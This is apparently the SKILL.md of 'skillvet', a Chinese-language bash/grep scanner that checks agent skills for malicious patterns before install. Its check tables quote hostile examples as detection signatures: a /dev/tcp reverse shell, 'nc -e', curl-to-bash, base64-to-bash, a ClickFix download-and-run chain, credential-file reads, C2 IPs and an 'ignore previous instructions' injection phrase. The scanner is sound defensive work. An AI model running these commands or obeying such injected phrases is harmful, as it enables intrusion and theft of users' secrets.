---
name: skillvet
description: "**ClawHub/社区技能的安全扫描器**  
该工具能够在您安装技能之前检测恶意软件、凭证盗用、数据泄露、命令注入、代码混淆、同形异义词攻击（homograph attacks）、ANSI代码注入（ANSI injection）以及特定类型的攻击模式等安全风险。适用于从ClawHub或任何公开市场安装技能时，也可用于审查第三方代理技能的安全性，或在将未经验证的代码提供给AI代理之前进行安全检测。  
**触发条件**：  
- 安装技能（install skill）  
- 审计技能（audit skill）  
- 检查技能（check skill）  
- 审查技能（vet skill）  
- 评估技能安全性（skill security）  
- 安全安装（safe install）  
- 询问技能是否安全（is this skill safe?）"
compatibility: "Requires bash, grep, find, and file (standard POSIX). safe-install.sh and scan-remote.sh require the clawdhub CLI. perl or ggrep (Homebrew GNU grep) recommended for full Unicode regex support on macOS."
metadata:
  version: "2.0.9"
  author: oakencore
---
# Skillvet

这是一个用于检测代理技能安全性的扫描工具，包含48项关键检查项和8项警告检查项。该工具完全依赖bash和grep命令，无需额外依赖库。它采用了多种检测模式，包括来自[Koi Security](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)、[Bitdefender](https://businessinsights.bitdefender.com/technical-advisory-openclaw-exploitation-enterprise-networks)、[Snyk](https://snyk.io/articles/clawdhub-malicious-campaign-ai-agent-skills/)和[1Password](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface)的检测规则。

## 使用方法

### 安全安装（包括扫描和在发现关键问题时自动移除工具）：

```bash
bash skills/skillvet/scripts/safe-install.sh <skill-slug>
```

### 扫描现有技能：

```bash
bash skills/skillvet/scripts/skill-audit.sh skills/some-skill
```

### 扫描所有已安装的技能：

```bash
for d in skills/*/; do bash skills/skillvet/scripts/skill-audit.sh "$d"; done
```

### JSON输出（适用于自动化脚本）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --json skills/some-skill
```

### SARIF输出（适用于GitHub代码扫描或VS Code）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --sarif skills/some-skill
```

### 摘要模式（每项技能显示一行结果）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --summary skills/some-skill
```

### 详细模式（显示执行的检查项及扫描的文件）：

```bash
bash skills/skillvet/scripts/skill-audit.sh --verbose skills/some-skill
```

### 在不安装工具的情况下扫描远程技能：

```bash
bash skills/skillvet/scripts/scan-remote.sh <skill-slug>
```

### 差异扫描（仅扫描版本间的变化）：

```bash
bash skills/skillvet/scripts/diff-scan.sh path/to/old-version path/to/new-version
```

### 退出代码：
- `0`：扫描完成，无问题；
- `1`：仅发现警告；
- `2`：发现关键安全问题。

### 高级选项

| 标志 | 描述 |
|------|-------------|
| `--json` | 生成JSON格式的输出，适用于持续集成（CI）或仪表盘展示 |
| `--sarif` | 生成SARIF v2.1.0格式的输出，适用于GitHub代码扫描 |
| `--summary` | 每项技能仅显示一行摘要信息 |
| `--verbose` | 显示执行的检查项及扫描的文件 |
| `--exclude-self` | 扫描时跳过当前目录 |
| `--max-file-size N` | 跳过大于N字节的文件 |
| `--max-depth N` | 限制目录遍历深度 |

### 遮免误报

- 可在技能目录下创建`.skillvetrc`文件来禁用特定的检查项；
- 也可以在代码中添加注释来屏蔽某些检查项。

### 提交前钩子

可以通过设置Git的提交前钩子，在提交代码前自动执行扫描。

### 风险评分

每个安全问题都带有相应的严重程度（1-10分），评分结果会包含在JSON、SARIF和摘要输出中。评分越高，表示问题越严重：
- **10分**：反向shell、已知的C2服务器IP地址；
- **9分**：数据泄露、通过管道连接到shell、持久化攻击、网络攻击、ClickFix漏洞、Base64编码的恶意代码执行；
- **7-8分**：凭证窃取、代码混淆、路径遍历、定时炸弹攻击；
- **4-6分**：使用Punycode编码的URL、混淆字符、ANSI转义序列、缩短的URL；
- **2-3分**：子进程执行、网络请求、文件写入操作。

### 关键安全检查（会自动阻止违规行为）

### 核心安全检查（共24项）

| 编号 | 检查项 | 例证 |
|---|-------|---------|
| 1 | 已知的数据泄露入口点 | `webhook.site`, `ngrok.io`, `requestbin` |
| 2 | 大量环境变量收集 | `printenv \|`, `${!*@}` |
| 3 | 未授权的API密钥使用 | 脚本中使用了`ANTHROPIC_API_KEY`, `TELEGRAM_BOT_TOKEN` |
| 4 | 代码混淆 | 使用Base64解码、十六进制转义、动态代码生成 |
| 5 | 路径遍历及敏感文件访问 | `../../`, `~/.ssh`, `~/.clawdbot` |
| 6 | 通过curl/wget进行数据泄露 | `curl --data`, `wget --post` |
| 7 | 反向shell或bind shell | `/dev/tcp/`, `nc -e`, `socat` |
| 8 `.env`文件被窃取 | 脚本中加载了`.env`文件（但文档中未提及） |
| 9 | 在Markdown中插入恶意指令 | `SKILL.md`文件中包含“忽略之前的指令” |
| 10 | 利用大型语言模型（LLM）工具 | 包含发送或发送密码的指令 |
| 11 | 代理配置被篡改 | 修改`AGENTS.md`, `SOUL.md`, `clawdbot.json`文件 |
| 12 | Unicode编码混淆 | 使用零宽度字符、RTL字符控制、双向文本字符 |
| 13 | 疑似用于设置的命令 | 在`SKILL.md`中通过curl或pip执行命令 |
| 14 | 社交工程攻击 | 下载外部二进制文件、提供“粘贴即运行”的指令 |
| 15 | 配置文件中包含`.env`文件 | 技能配置文件中包含`.env`文件（而非示例文件） |
| 16 | 混淆字符的URL | 主机名中使用了Cyrillic字母和Latin字母的混淆 |
| 17 | ANSI转义序列 | 代码或数据文件中使用了终端转义序列 |
| 18 | 使用Punycode编码的域名 | 域名前缀为`xn--` |
| 19 | 双重编码的路径 | 使用`%25XX`进行编码绕过 |
| 20 | 缩短的URL | 使用`bit.ly`, `t.co`, `tinyurl.com`等隐藏实际目标地址 |
| 21 | 通过管道连接到shell | `curl \| bash`（支持HTTP和HTTPS） |
| 22 | 逃避字符串检查 | 使用`String.fromCharCode`, `getattr`, `dynamic call assembly` |
| 23 | 数据流链攻击 | 同一个文件用于读取秘密、编码数据并发送网络请求 |
| 24 | 定时炸弹攻击 | `Date.now() > timestamp`, `setTimeout(fn, 86400000)` |
| 25 | 已知的C2/IOC服务器IP地址 | `91.92.242.30`, `54.91.154.110`（已知AMOS攻击服务器） |
| 26 | 需密码解压的文件 | 使用“使用密码解压：openclaw”来规避安全检测 |
| 27 | 通过Paste服务上传恶意脚本 | `glot.io`, `pastebin.com`等网站托管恶意脚本 |
| 28 | GitHub上的二进制文件下载 | 在GitHub上提供虚假的依赖库链接（指向`.zip`或`.exe`文件） |
| 29 | 使用Base64编码传递给解释器 | `echo '...' \| base64 -D \| bash`（macOS上的常见攻击方式） |
| 30 | 子进程与网络请求结合 | Python/JS代码中隐藏了用于连接shell的命令 |
| 31 | 假冒的URL误导 | 真实恶意文件前使用了诱骗性URL |
| 32 | 进程持久化及网络攻击 | `nohup curl ... &`（带有网络访问功能的后门） |
| 33 | 假假的依赖项声明 | “依赖项”部分包含可疑的外部下载链接 |
| 34 | 使用`xattr/chmod`进行攻击 | 绕过macOS的Gatekeeper安全机制 |
| 35 | ClickFix攻击链 | `curl -o /tmp/x && chmod +x && ./x`, `open -a` |
| 36 | 可疑的包来源 | 从非官方仓库安装依赖项（如`openclaw-core`, `some-lib`） |
| 37 | 伪造的操作系统更新提示 | “需要更新Apple软件以确保兼容性” |
| 38 | 已知的恶意ClawHub攻击者 | `zaycv`, `Ddoy233`, `Sakaen736jih`, `Hightower6eu` |
| 39 | 使用`/dev/tcp`建立反向shell | `bash -i >/dev/tcp/IP/PORT 0>&1` |
| 40 | 使用`nohup`创建后门 | `nohup bash -c '...' >/dev/null`（带有网络请求） |
| 41 | Python反向shell | `socket.connect` + `dup2`, `pty.spawn('/bin/bash')` |
| 42 | 终端输出伪装 | 在恶意文件前显示“正在下载...”的提示 |
| 43 | 访问凭证文件 | 直接读取`.env`, `.pem`, `.aws/credentials`文件 |
| 44 | 在`TMPDIR`中临时存储恶意文件 | 使用`TMPDIR`存储恶意文件后执行 |
| 45 | 在GitHub上直接执行代码 | `curl raw.githubusercontent.com/... \| bash` |
| 46 | 使用Echo编码的恶意文件 | 长Base64字符串被解码后传递给解码器 |
| 48 | 技能名称中的拼写错误 | 如`clawdhub-helper`, `openclaw-cli`, `skillvet1`等 |

### 警告检查项（需要人工审核）

| 编号 | 检查项 | 例证 |
|---|-------|---------|
| W1 | 未知的外部工具依赖 | 安装说明中提到了非标准的CLI工具 |
| W2 | 使用子进程 | `child_process`, `execSync`, `spawn`, `subprocess` |
| W3 | 发起网络请求 | `axios`, `fetch`, `requests`等库的使用 |
| W4 | 文件被压缩/捆绑 | 文件的第一行超过500个字符，无法进行安全扫描 |
| W5 | 文件系统写操作 | `writeFile`, `open('w)', `fs.append` |
| W6 | 不安全的传输方式 | `curl -k`, `verify=False`（禁用了TLS加密） |
| W7 | 使用不受信任的Docker镜像源 |

### 支持的文件类型

`.md`, `.js`, `.ts`, `.tsx`, `.jsx`, `.py`, `.sh`, `.bash`, `.rs`, `.go`, `.rb`, `.c`, `.cpp`, `.json`, `.yaml`, `.yml`, `.toml`, `.txt`, `.env*`, `Dockerfile*`, `Makefile`, `pom.xml`, `gradle`。

**注意**：二进制文件会被自动忽略；符号链接也会被扫描。

### 兼容性

该工具支持Linux和macOS系统。对于需要使用正则表达式的检查（如#12, #16, #17），会优先使用`grep -P`；在没有Perl的系统中（如macOS），则会使用`perl`作为替代方案。如果这两种方法都不可用，这些检查项将会被忽略。

### IOC（Indicators of Compromise）更新

检查项#25中的C2服务器IP地址列表基于以下来源更新：
- [Koi Security的报告](https://www.koi.ai/blog/clawhavoc-341-malicious-clawedbot-skills-found-by-the-bot-they-were-targeting)（2026年2月）
- [The Hacker News的报道](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [OpenSourceMalware的分析](https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto)

如需更新IOC列表，请编辑`scripts/patterns.b64`文件中的`KNOWN_IPS`部分（该文件使用Base64编码的正则表达式）。

### 持续集成/持续交付（CI/CD）集成

提供了一个`.github/workflows/test.yml`文件，可在推送代码或提交Pull Request时在Ubuntu和macOS上自动运行测试。

### GitHub代码扫描（使用SARIF格式）

```yaml
- name: Run skillvet
  run: bash scripts/skill-audit.sh --sarif skills/some-skill > results.sarif || true

- name: Upload SARIF
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

### 限制

- 该工具仅进行静态分析，对基于英文的提示注入攻击模式有效；
- 对压缩过的JavaScript代码会进行标记，但不会对其进行解码；
- 即使扫描结果正常，也不能保证绝对的安全性；
- 扫描工具本身会显示其检测到的问题（因为其检测规则中包含了这些字符串）。在持续集成（CI）过程中，可以使用`--exclude-self`选项跳过自我扫描。